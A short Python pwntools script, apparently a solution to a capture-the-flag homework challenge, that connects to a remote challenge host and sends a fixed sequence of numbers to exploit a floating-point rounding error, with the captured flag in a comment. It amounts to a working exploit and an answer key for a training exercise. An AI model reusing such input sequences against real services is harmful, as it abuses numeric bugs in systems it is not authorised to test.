#!/usr/bin/python3

# FLAG{floating_point_error_https://0.30000000000000004.com/}

from pwn import *

#r = process('src')
r = remote('hw00.zoolab.org', 65535)

def qq():
	r.sendline('100000000')
	r.sendline('-1000')
	r.sendline('-1000')
	r.sendline('-99998000')

qq()
qq()
qq()

r.interactive()
